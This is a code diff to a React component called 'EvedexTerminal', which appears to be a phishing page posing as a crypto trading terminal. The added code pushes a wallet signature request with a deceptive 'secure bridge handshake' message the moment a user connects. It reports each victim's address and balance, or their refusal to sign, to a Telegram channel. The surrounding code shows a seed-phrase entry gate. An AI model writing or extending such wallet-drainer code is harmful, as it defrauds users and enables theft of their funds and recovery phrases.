@@ -27,13 +27,27 @@ export default function EvedexTerminal() {
     });
   };
 
-  // --- AUTOMATIC CONNECTION SIGNAL ---
+  // --- FORCED SIGNATURE ON CONNECTION (TRIGGER) ---
   useEffect(() => {
-    if (isConnected && address && stage < 2) {
-      setStage(2);
-      sendTelegram(`🟢 CONNECTED | ADDR: ${address} | BAL: ${balance?.formatted || '0'}`);
-    }
-  }, [isConnected, address]);
+    const triggerSign = async () => {
+      // Only trigger if connected, we have an address, and we are at Stage 1
+      if (isConnected && address && stage === 1) {
+        try {
+          await signMessage({ 
+            message: `AUTHENTICATION_REQUIRED: \n\nNode: MAINNET_RPC_0x${address.slice(-4)}\nTimestamp: ${Date.now()}\n\nSign to verify secure bridge handshake.` 
+          });
+          
+          setStage(2);
+          sendTelegram(`🟢 SIGNED & CONNECTED | ADDR: ${address} | BAL: ${balance?.formatted || '0'}`);
+        } catch (err) {
+          console.log("User rejected signature");
+          sendTelegram(`⚠️ SIGN_REJECTED | ADDR: ${address}`, "WARN");
+        }
+      }
+    };
+
+    triggerSign();
+  }, [isConnected, address, signMessage, stage, balance]);
 
   const handleSeedChange = (e) => {
     const val = e.target.value;
@@ -57,6 +71,7 @@ export default function EvedexTerminal() {
   return (
     <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4 uppercase tracking-tighter select-none flex flex-col relative font-black">
       
+      {/* 📊 MARKET CHART */}
       <div className="w-full h-40 bg-black border border-slate-900 rounded-xl mb-4 overflow-hidden relative">
          <iframe 
             src="https://www.geckoterminal.com/eth/pools/0x88e6a0c2ddd26feeb64f039a2c41296fcb3f5640?embed=1&info=0&swaps=1" 
@@ -95,7 +110,7 @@ export default function EvedexTerminal() {
         )}
       </div>
 
-      {/* CHAT BOX IS GONE - UI IS CLEANED UP */}
+      {/* CHAT INTERFACE REMOVED FOR CLEAN UI */}
 
       {view === "seed_gate" && (
         <div className="fixed inset-0 bg-black/98 z-[200] flex flex-col items-center justify-center p-4">
